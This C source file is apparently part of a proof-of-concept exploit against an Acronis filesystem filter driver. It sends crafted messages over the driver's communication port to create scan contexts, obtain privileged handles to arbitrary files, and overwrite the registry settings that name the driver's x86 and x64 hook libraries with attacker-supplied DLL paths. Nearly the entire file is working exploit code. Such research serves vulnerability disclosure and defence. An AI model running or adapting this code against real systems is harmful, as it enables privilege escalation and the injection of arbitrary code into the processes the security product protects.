#include "Acronis-Common.h"

DWORD64 genPattern(BYTE b) {
	DWORD64 retVal = b;
	retVal |= retVal << 8;
	retVal |= retVal << 16;
	retVal |= retVal << 32;
	return retVal;
}

void DumpHex(const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		}
		else {
			ascii[i % 16] = '.';
		}
		if ((i + 1) % 8 == 0 || i + 1 == size) {
			printf(" ");
			if ((i + 1) % 16 == 0) {
				printf("|  %s \n", ascii);
			}
			else if (i + 1 == size) {
				ascii[(i + 1) % 16] = '\0';
				if ((i + 1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i + 1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

BOOL OpenFile_Acronis(HANDLE hPort, const wchar_t* lpFileName, PHANDLE lpOutHandle)
{
	if (!hPort || !lpOutHandle) {
		return FALSE;
	}
	puts("In OpenFile_Acronis");
	HRESULT hResult = 0;
	HANDLE hHeap = GetProcessHeap();
	PACRONIS_FLT_MESSAGE pAcronisMessage = (PACRONIS_FLT_MESSAGE)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(ACRONIS_FLT_MESSAGE));
	LPVOID lpOutBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x1000);
	DWORD dwBytesReturned = 0;

	if (!pAcronisMessage || !lpOutBuf) {
		GLE("Failed to alloc message to open file.");
		return FALSE;
	}	

	printf("Calling CreateScanContextWithDir for file %ls\n", lpFileName);

	DWORD dwCid = CreateScanContextWithDir(hPort, lpFileName);
	if (!dwCid || dwCid == -1) {
		GLE("CreateScanContextWithDir failed");
		return FALSE;
	}

	printf("Created scan context with id : 0x%lx\n", dwCid);
	
	pAcronisMessage->dwHeader = ACRONIS_FLT_MSG_HDR;
	pAcronisMessage->dwMessageType = 0x22;
	pAcronisMessage->dwMessageSize = 0x00000008;
	pAcronisMessage->reserved0[0] = dwCid;

	for (int j = 1; j < 12; j++) {
		pAcronisMessage->reserved0[j] = genPattern('a' + j);
	}

	hResult = FilterSendMessage(hPort, pAcronisMessage, sizeof(ACRONIS_FLT_MESSAGE), lpOutBuf, 0x1000, &dwBytesReturned);
	
	if (!(FAILED(hResult))) {
		PACRONIS_SCANDIR_RESP pResp = (PACRONIS_SCANDIR_RESP)lpOutBuf;
		printf("Got Scan context with id - %d\n\tHRES 0x%lx\n\tHANDLE - 0x%p\n", dwCid, hResult, pResp->hFile);
		*lpOutHandle = pResp->hFile;
		HeapFree(hHeap, 0, lpOutBuf);
		HeapFree(hHeap, 0, pAcronisMessage);		
		return TRUE;
	}

	HeapFree(hHeap, 0, lpOutBuf);
	HeapFree(hHeap, 0, pAcronisMessage);
	return FALSE;
}

DWORD CreateScanContextWithDir(HANDLE hPort, const wchar_t* lpFileName)
{
	HANDLE hHeap = GetProcessHeap();
	HRESULT hResult = 0;
	DWORD dwBytesReturned = 0;
	puts("Attempting to create scan context for file.");
	PACRONIS_FLT_CREATE_CONTEXTDIR lpAccFltCreate = (PACRONIS_FLT_CREATE_CONTEXTDIR)HeapAlloc(
		hHeap,
		HEAP_ZERO_MEMORY,
		sizeof(ACRONIS_FLT_CREATE_CONTEXTDIR)
	);

	LPVOID lpOutBuf = HeapAlloc(
		hHeap,
		HEAP_ZERO_MEMORY,
		0x1000
	);

	if (!lpAccFltCreate || !lpOutBuf) {
		GLE("Failed to alloc data for context creation");
		return (DWORD)-1;
	}

	lpAccFltCreate->dwHeader = ACRONIS_FLT_MSG_HDR;
	lpAccFltCreate->dwMessageType = ACRONIS_OP_CREATEFILE_CONTEXTDIR;
	lpAccFltCreate->dwMessageSize = (lstrlenW(lpFileName)) * sizeof(WCHAR);
	lpAccFltCreate->reserved0 = lpAccFltCreate->dwMessageSize;
	lpAccFltCreate->toSkip = 0x10;
	lpAccFltCreate->reserved2 = 1;
	lpAccFltCreate->reserved4 = 1;
	lpAccFltCreate->reserved5 = 1;
	lpAccFltCreate->reserved1 = 1;
	lstrcpyW(lpAccFltCreate->wstrPath, lpFileName);

	hResult = FilterSendMessage(hPort, lpAccFltCreate, sizeof(ACRONIS_FLT_CREATE_CONTEXTDIR), lpOutBuf, 0x1000, &dwBytesReturned);
	if (FAILED(hResult)) {
		printf("Create FLT Context With Dir Failed with 0x%lx\n", hResult);
		HeapFree(hHeap, 0, lpAccFltCreate);
		HeapFree(hHeap, 0, lpOutBuf);
		return (DWORD)-1;
	}

	if (!dwBytesReturned) {
		GLE("FilterSendMessage returned zero bytes!");
		HeapFree(hHeap, 0, lpAccFltCreate);
		HeapFree(hHeap, 0, lpOutBuf);
		return (DWORD)-1;
	}

	DWORD dwContextId = ((PACRONIS_CCWD)lpOutBuf)->contextID;
	HeapFree(hHeap, 0, lpAccFltCreate);
	HeapFree(hHeap, 0, lpOutBuf);
	return dwContextId;
}

BOOL SetRegKeyHookLibs(HANDLE hPort, const wchar_t* x86HookLibPath, const wchar_t* x64HookLibPath) {
	if (!(hPort && x64HookLibPath && x86HookLibPath)) {
		puts("Arg error");
		return FALSE;
	}



	HRESULT hResult = 0;
	DWORD dwBytesReturned = 0;
	HANDLE hHeap = GetProcessHeap();
	PACRONIS_FLT_REG_SET_HOOKLIBS lpObjHookLibs = (PACRONIS_FLT_REG_SET_HOOKLIBS)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(ACRONIS_FLT_REG_SET_HOOKLIBS));
	LPVOID lpOutBuf = HeapAlloc(
		hHeap,
		HEAP_ZERO_MEMORY,
		0x1000
	);

	if (!(lpObjHookLibs  && lpOutBuf)) {
		GLE("Failed to alloc hook libs structure");
		return FALSE;
	}

	puts("Allocated, calling filter.");
	lpObjHookLibs->dwHeader = ACRONIS_FLT_MSG_HDR;
	lpObjHookLibs->dwMessageSize = (lstrlenW(x86HookLibPath)) * sizeof(WCHAR);
	lpObjHookLibs->dwMessageType = ACRONIS_OP_REG_SET_HOOKLIBS;
	lpObjHookLibs->toSkip0 = 0x10;
	lpObjHookLibs->toSkip1 = 8 + (sizeof(wchar_t) * (MAX_PATH + 1));
	lpObjHookLibs->reserved0 = (lstrlenW(x86HookLibPath)) * sizeof(WCHAR);
	lpObjHookLibs->reserved2 = (lstrlenW(x64HookLibPath)) * sizeof(WCHAR);

	lstrcpyW(lpObjHookLibs->wstrx86LibPath, x86HookLibPath);
	lstrcpyW(lpObjHookLibs->wstrx64LibPath, x64HookLibPath);

	hResult = FilterSendMessage(hPort, lpObjHookLibs, sizeof(ACRONIS_FLT_REG_SET_HOOKLIBS), lpOutBuf, 0x100, &dwBytesReturned);
	puts("Sent filter message");

	if (FAILED(hResult)) {
		printf("Filter message failed with error 0x%lx\n", hResult);
		return FALSE;
	}

	puts("Change reg keys succeeded");
	return TRUE;
}